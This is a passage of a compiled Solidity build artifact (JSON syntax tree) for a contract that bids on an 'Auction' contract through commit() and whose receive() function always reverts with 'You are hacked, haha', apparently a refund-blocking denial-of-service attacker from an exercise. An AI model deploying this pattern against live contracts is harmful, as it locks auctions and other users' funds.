                      "referencedDeclaration": 1240,
                      "src": "1033:7:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Auction_$1060",
                        "typeString": "contract Auction"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "argumentTypes": null,
                      "arguments": [
                        {
                          "argumentTypes": null,
                          "id": 1249,
                          "name": "auctionAddress",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 1244,
                          "src": "1051:14:4",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        ],
                        "id": 1248,
                        "name": "Auction",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": 1060,
                        "src": "1043:7:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_type$_t_contract$_Auction_$1060_$",
                          "typeString": "type(contract Auction)"
                        }
                      },
                      "id": 1250,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "typeConversion",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "1043:23:4",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_contract$_Auction_$1060",
                        "typeString": "contract Auction"
                      }
                    },
                    "src": "1033:33:4",
                    "typeDescriptions": {
                      "typeIdentifier": "t_contract$_Auction_$1060",
                      "typeString": "contract Auction"
                    }
                  },
                  "id": 1252,
                  "nodeType": "ExpressionStatement",
                  "src": "1033:33:4"
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "id": 1256,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "lValueRequested": false,
                    "leftHandSide": {
                      "argumentTypes": null,
                      "id": 1253,
                      "name": "owner",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [],
                      "referencedDeclaration": 1242,
                      "src": "1077:5:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address",
                        "typeString": "address"
                      }
                    },
                    "nodeType": "Assignment",
                    "operator": "=",
                    "rightHandSide": {
                      "argumentTypes": null,
                      "expression": {
                        "argumentTypes": null,
                        "id": 1254,
                        "name": "msg",
                        "nodeType": "Identifier",
                        "overloadedDeclarations": [],
                        "referencedDeclaration": -15,
                        "src": "1085:3:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_magic_message",
                          "typeString": "msg"
                        }
                      },
                      "id": 1255,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "lValueRequested": false,
                      "memberName": "sender",
                      "nodeType": "MemberAccess",
                      "referencedDeclaration": null,
                      "src": "1085:10:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_address_payable",
                        "typeString": "address payable"
                      }
                    },
                    "src": "1077:18:4",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "id": 1257,
                  "nodeType": "ExpressionStatement",
                  "src": "1077:18:4"
                }
              ]
            },
            "documentation": null,
            "id": 1259,
            "implemented": true,
            "kind": "constructor",
            "modifiers": [],
            "name": "",
            "nodeType": "FunctionDefinition",
            "overrides": null,
            "parameters": {
              "id": 1245,
              "nodeType": "ParameterList",
              "parameters": [
                {
                  "constant": false,
                  "id": 1244,
                  "mutability": "mutable",
                  "name": "auctionAddress",
                  "nodeType": "VariableDeclaration",
                  "overrides": null,
                  "scope": 1259,
                  "src": "991:22:4",
                  "stateVariable": false,
                  "storageLocation": "default",
                  "typeDescriptions": {
                    "typeIdentifier": "t_address",
                    "typeString": "address"
                  },
                  "typeName": {
                    "id": 1243,
                    "name": "address",
                    "nodeType": "ElementaryTypeName",
                    "src": "991:7:4",
                    "stateMutability": "nonpayable",
                    "typeDescriptions": {
                      "typeIdentifier": "t_address",
                      "typeString": "address"
                    }
                  },
                  "value": null,
                  "visibility": "internal"
                }
              ],
              "src": "990:24:4"
            },
            "returnParameters": {
              "id": 1246,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1022:0:4"
            },
            "scope": 1289,
            "src": "979:124:4",
            "stateMutability": "nonpayable",
            "virtual": false,
            "visibility": "public"
          },
          {
            "body": {
              "id": 1279,
              "nodeType": "Block",
              "src": "1146:91:4",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "arguments": [
                      {
                        "argumentTypes": null,
                        "commonType": {
                          "typeIdentifier": "t_address",
                          "typeString": "address"
                        },
                        "id": 1266,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "leftExpression": {
                          "argumentTypes": null,
                          "expression": {
                            "argumentTypes": null,
                            "id": 1263,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -15,
                            "src": "1165:3:4",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 1264,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "sender",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": null,
                          "src": "1165:10:4",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address_payable",
                            "typeString": "address payable"
                          }
                        },
                        "nodeType": "BinaryOperation",
                        "operator": "==",
                        "rightExpression": {
                          "argumentTypes": null,
                          "id": 1265,
                          "name": "owner",
                          "nodeType": "Identifier",
                          "overloadedDeclarations": [],
                          "referencedDeclaration": 1242,
                          "src": "1179:5:4",
                          "typeDescriptions": {
                            "typeIdentifier": "t_address",
                            "typeString": "address"
                          }
                        },
                        "src": "1165:19:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_bool",
                          "typeString": "bool"
                        }
                      ],
                      "id": 1262,
                      "name": "require",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        -18,
                        -18
                      ],
                      "referencedDeclaration": -18,
                      "src": "1157:7:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_require_pure$_t_bool_$returns$__$",
                        "typeString": "function (bool) pure"
                      }
                    },
                    "id": 1267,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1157:28:4",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1268,
                  "nodeType": "ExpressionStatement",
                  "src": "1157:28:4"
                },
                {
                  "expression": {
                    "argumentTypes": null,
                    "arguments": [],
                    "expression": {
                      "argumentTypes": [],
                      "arguments": [
                        {
                          "argumentTypes": null,
                          "expression": {
                            "argumentTypes": null,
                            "id": 1274,
                            "name": "msg",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": -15,
                            "src": "1217:3:4",
                            "typeDescriptions": {
                              "typeIdentifier": "t_magic_message",
                              "typeString": "msg"
                            }
                          },
                          "id": 1275,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "value",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": null,
                          "src": "1217:9:4",
                          "typeDescriptions": {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        }
                      ],
                      "expression": {
                        "argumentTypes": [
                          {
                            "typeIdentifier": "t_uint256",
                            "typeString": "uint256"
                          }
                        ],
                        "expression": {
                          "argumentTypes": null,
                          "expression": {
                            "argumentTypes": null,
                            "id": 1269,
                            "name": "auction",
                            "nodeType": "Identifier",
                            "overloadedDeclarations": [],
                            "referencedDeclaration": 1240,
                            "src": "1196:7:4",
                            "typeDescriptions": {
                              "typeIdentifier": "t_contract$_Auction_$1060",
                              "typeString": "contract Auction"
                            }
                          },
                          "id": 1272,
                          "isConstant": false,
                          "isLValue": false,
                          "isPure": false,
                          "lValueRequested": false,
                          "memberName": "commit",
                          "nodeType": "MemberAccess",
                          "referencedDeclaration": 865,
                          "src": "1196:14:4",
                          "typeDescriptions": {
                            "typeIdentifier": "t_function_external_payable$__$returns$__$",
                            "typeString": "function () payable external"
                          }
                        },
                        "id": 1273,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": false,
                        "lValueRequested": false,
                        "memberName": "value",
                        "nodeType": "MemberAccess",
                        "referencedDeclaration": null,
                        "src": "1196:20:4",
                        "typeDescriptions": {
                          "typeIdentifier": "t_function_setvalue_pure$_t_uint256_$returns$_t_function_external_payable$__$returns$__$value_$",
                          "typeString": "function (uint256) pure returns (function () payable external)"
                        }
                      },
                      "id": 1276,
                      "isConstant": false,
                      "isLValue": false,
                      "isPure": false,
                      "kind": "functionCall",
                      "lValueRequested": false,
                      "names": [],
                      "nodeType": "FunctionCall",
                      "src": "1196:31:4",
                      "tryCall": false,
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_external_payable$__$returns$__$value",
                        "typeString": "function () payable external"
                      }
                    },
                    "id": 1277,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1196:33:4",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1278,
                  "nodeType": "ExpressionStatement",
                  "src": "1196:33:4"
                }
              ]
            },
            "documentation": null,
            "functionSelector": "3c7a3aff",
            "id": 1280,
            "implemented": true,
            "kind": "function",
            "modifiers": [],
            "name": "commit",
            "nodeType": "FunctionDefinition",
            "overrides": null,
            "parameters": {
              "id": 1260,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1126:2:4"
            },
            "returnParameters": {
              "id": 1261,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1146:0:4"
            },
            "scope": 1289,
            "src": "1111:126:4",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          },
          {
            "body": {
              "id": 1287,
              "nodeType": "Block",
              "src": "1272:49:4",
              "statements": [
                {
                  "expression": {
                    "argumentTypes": null,
                    "arguments": [
                      {
                        "argumentTypes": null,
                        "hexValue": "596f7520617265206861636b65642c2068616861",
                        "id": 1284,
                        "isConstant": false,
                        "isLValue": false,
                        "isPure": true,
                        "kind": "string",
                        "lValueRequested": false,
                        "nodeType": "Literal",
                        "src": "1290:22:4",
                        "subdenomination": null,
                        "typeDescriptions": {
                          "typeIdentifier": "t_stringliteral_32c1a1421c0407123526da9ce5266a7ff2762a7a95918502cb615c08c85d5fc1",
                          "typeString": "literal_string \"You are hacked, haha\""
                        },
                        "value": "You are hacked, haha"
                      }
                    ],
                    "expression": {
                      "argumentTypes": [
                        {
                          "typeIdentifier": "t_stringliteral_32c1a1421c0407123526da9ce5266a7ff2762a7a95918502cb615c08c85d5fc1",
                          "typeString": "literal_string \"You are hacked, haha\""
                        }
                      ],
                      "id": 1283,
                      "name": "revert",
                      "nodeType": "Identifier",
                      "overloadedDeclarations": [
                        -19,
                        -19
                      ],
                      "referencedDeclaration": -19,
                      "src": "1283:6:4",
                      "typeDescriptions": {
                        "typeIdentifier": "t_function_revert_pure$_t_string_memory_ptr_$returns$__$",
                        "typeString": "function (string memory) pure"
                      }
                    },
                    "id": 1285,
                    "isConstant": false,
                    "isLValue": false,
                    "isPure": false,
                    "kind": "functionCall",
                    "lValueRequested": false,
                    "names": [],
                    "nodeType": "FunctionCall",
                    "src": "1283:30:4",
                    "tryCall": false,
                    "typeDescriptions": {
                      "typeIdentifier": "t_tuple$__$",
                      "typeString": "tuple()"
                    }
                  },
                  "id": 1286,
                  "nodeType": "ExpressionStatement",
                  "src": "1283:30:4"
                }
              ]
            },
            "documentation": null,
            "id": 1288,
            "implemented": true,
            "kind": "receive",
            "modifiers": [],
            "name": "",
            "nodeType": "FunctionDefinition",
            "overrides": null,
            "parameters": {
              "id": 1281,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1252:2:4"
            },
            "returnParameters": {
              "id": 1282,
              "nodeType": "ParameterList",
              "parameters": [],
              "src": "1272:0:4"
            },
            "scope": 1289,
            "src": "1245:76:4",
            "stateMutability": "payable",
            "virtual": false,
            "visibility": "external"
          }
        ],
        "scope": 1290,
        "src": "905:419:4"
      }
    ],
    "src": "0:1889:4"
  },
  "compiler": {
    "name": "solc",
    "version": "0.6.12+commit.27d51765.Emscripten.clang"
  },
  "networks": {},
  "schemaVersion": "3.3.1",
  "updatedAt": "2020-11-26T13:20:29.758Z",
  "devdoc": {
    "kind": "dev",
    "methods": {},
    "version": 1
  },
  "userdoc": {
    "kind": "user",
    "methods": {},
    "version": 1
  }
}